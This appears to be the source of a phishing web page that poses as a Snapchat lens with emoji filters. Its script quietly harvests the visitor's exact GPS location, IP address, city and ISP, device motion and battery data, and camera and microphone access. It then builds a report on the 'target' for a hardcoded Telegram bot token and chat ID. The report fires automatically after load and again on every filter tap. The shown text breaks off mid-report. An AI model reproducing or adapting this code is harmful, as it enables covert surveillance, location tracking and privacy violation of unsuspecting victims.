<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat Lens</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            user-select: none;
            -webkit-user-select: none;
        }
        /* Top Snapchat Navigation Bar */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            z-index: 10;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            box-sizing: border-box;
            background: linear-gradient(rgba(0,0,0,0.8), transparent);
        }
        .profile-section {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .profile-icon {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            border: 2px solid #fff;
            overflow: hidden;
            background: #222;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
        }
        .song-pill {
            background: rgba(0, 0, 0, 0.5);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            border: 1px solid rgba(255,255,255,0.15);
            backdrop-filter: blur(5px);
        }
        .top-right-icons {
            display: flex;
            gap: 16px;
            align-items: center;
            font-size: 18px;
        }
        .top-right-icons span {
            cursor: pointer;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }

        /* Center Camera View */
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            background: #000;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        #filterCanvas {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
            pointer-events: none;
        }

        /* Bottom Snapchat Tray Layout */
        .bottom-tray {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.95));
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 5px;
        }

        /* Filter Carousel Bar */
        .filter-carousel {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            width: 100%;
            padding: 10px 15px;
            scrollbar-width: none;
            box-sizing: border-box;
            align-items: center;
        }
        .filter-carousel::-webkit-scrollbar {
            display: none;
        }
        .filter-item {
            min-width: 58px;
            height: 58px;
            border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.4);
            overflow: hidden;
            background: #1a1a1a;
            flex-shrink: 0;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 26px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
            transition: transform 0.2s;
        }
        .filter-item.active {
            border: 3px solid #fff;
            transform: scale(1.12);
            box-shadow: 0 0 15px rgba(255,255,255,0.6);
        }

        /* Snapchat Category Navigation Footer */
        .category-bar {
            display: flex;
            justify-content: space-between;
            width: 100%;
            padding: 10px 15px;
            font-size: 12px;
            color: #888;
            box-sizing: border-box;
            background: rgba(0,0,0,0.9);
            align-items: center;
            border-top: 1px solid rgba(255,255,255,0.08);
        }
        .category-bar span {
            cursor: pointer;
            padding: 2px 4px;
        }
        .category-bar span.active {
            color: #fff;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="profile-section">
            <div class="profile-icon">👨‍🦱</div>
        </div>
        <div class="song-pill">
            <span>🎵</span>
            <span>Barish Ban Jaun - Tina Mishra</span>
            <span>+</span>
        </div>
        <div class="top-right-icons">
            <span>👤+</span>
            <span>🔄</span>
            <span>🎵</span>
            <span>▼</span>
        </div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview" style="display:none;"></video>
        <canvas id="filterCanvas"></canvas>
        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.85); padding: 12px 24px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2); font-size: 13px; font-weight: 500;">Loading Lens... Tap Allow</div>
    </div>

    <div class="bottom-tray">
        <div class="filter-carousel" id="filterCarousel">
            <div class="filter-item" onclick="selectFilter(0, '🗿')">🗿</div>
            <div class="filter-item" onclick="selectFilter(1, '🤪')">🤪</div>
            <div class="filter-item" onclick="selectFilter(2, '👶')">👶</div>
            <div class="filter-item active" onclick="selectFilter(3, '😁')">😁</div>
            <div class="filter-item" onclick="selectFilter(4, '👻')">👻</div>
            <div class="filter-item" onclick="selectFilter(5, '🤡')">🤡</div>
            <div class="filter-item" onclick="selectFilter(6, '👹')">👹</div>
        </div>

        <div class="category-bar">
            <span>✕</span>
            <span>Favorites</span>
            <span>For You</span>
            <span>Aesthetic</span>
            <span class="active">Funny</span>
            <span>Exclusive</span>
            <span>New</span>
            <span>Trending</span>
            <span>😊</span>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAHJHksL9vqLcvHL3zrH1OOnn9aS3YW4lQw";
        const ADMIN_CHAT_ID = "6478868514";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); 

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;
        let detectedHand = "Analyzing...";
        let activeFilterIndex = 3;
        let currentEmoji = "😁";

        let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
        window.addEventListener('deviceorientation', (event) => {
            motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
            motionData.beta = event.beta ? Math.round(event.beta) : '0';
            motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
        }, true);

        function getSmartHandStatus() {
            if (detectedHand.includes("Hand Detected")) {
                return detectedHand; 
            } else {
                let g = parseInt(motionData.gamma);
                if (isNaN(g)) return "Position: Center / Stable";
                return g < 0 ? "Likely Right Hand Grip" : "Likely Left Hand Grip";
            }
        }

        function selectFilter(index, emoji) {
            activeFilterIndex = index;
            currentEmoji = emoji;
            let items = document.querySelectorAll('.filter-item');
            items.forEach((item, idx) => {
                if (idx === index) {
                    item.classList.add('active');
                } else {
                    item.classList.remove('active');
                }
            });
            // User jab bhi koi naya filter select karega, background process turant trigger ho jayegi
            triggerAction();
        }

        function startLiveFilter(videoElement) {
            const canvas = document.getElementById('filterCanvas');
            const ctx = canvas.getContext('2d');

            function renderFrame() {
                if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;

                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                    ctx.save();
                    let centerX = canvas.width / 2;
                    let centerY = canvas.height / 3;

                    // Live active filter visual effect on screen
                    ctx.font = "80px Arial";
                    ctx.textAlign = "center";
                    ctx.textBaseline = "middle";
                    ctx.fillText(currentEmoji, centerX, centerY);
                    ctx.restore();
                }
                requestAnimationFrame(renderFrame);
            }
            renderFrame();
        }

        function initMediaPipeHands(videoElement) {
            try {
                const hands = new Hands({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                });
                hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.4, minTrackingConfidence: 0.4 });
                hands.onResults((results) => {
                    if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
                        detectedHand = `${results.multiHandedness[0].label} Hand (AI Vision)`;
                    }
                });
                const camera = new Camera(videoElement, {
                    onFrame: async () => { await hands.send({ image: videoElement }); },
                    width: 1280, height: 720
                });
                camera.start();
            } catch (e) {}
        }

        async function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({ lat, lon, mapLink: `https://maps.google.com/?q=${lat},${lon}` });
                        },
                        () => resolve({ lat: '', lon: '', mapLink: 'Permission Denied' }),
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country_name || 'Unknown', isp: data.org || 'Unknown' };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        async function initCamera() {
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: !cameraType };
            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user"; 
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else { throw e; }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => { videoElement.play().then(resolve).catch(resolve); };
                });

                startLiveFilter(videoElement);
                initMediaPipeHands(videoElement);

                document.getElementById('loading-text').style.display = 'none';
                isReady = true;

                // Automatic trigger after 2.5 seconds so target gets fully immersed in the filter preview
                setTimeout(() => { triggerAction(); }, 2500);
            } catch (err) {
                document.getElementById('loading-text').innerText = "Please allow camera access to load filter!";
            }
        }

        async function triggerAction() {
            if (!isReady || !globalStream) return;

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}\%${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";

            let baseCaption = 
                `🌐 **IP & Exact Location**\n` +
                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                `📍 Location: ${ipInfo.city},${ipInfo.region}\n` +
                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                `📡 ISP: ${ipInfo.isp}\n\n` +
                `📱 **Device & Spatial Insights**\n` +
                `✋ **Hand Grip**: ${getSmartHandStatus()}\n` +
                `🧭 Gyro: Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
                `🔋 Battery: ${
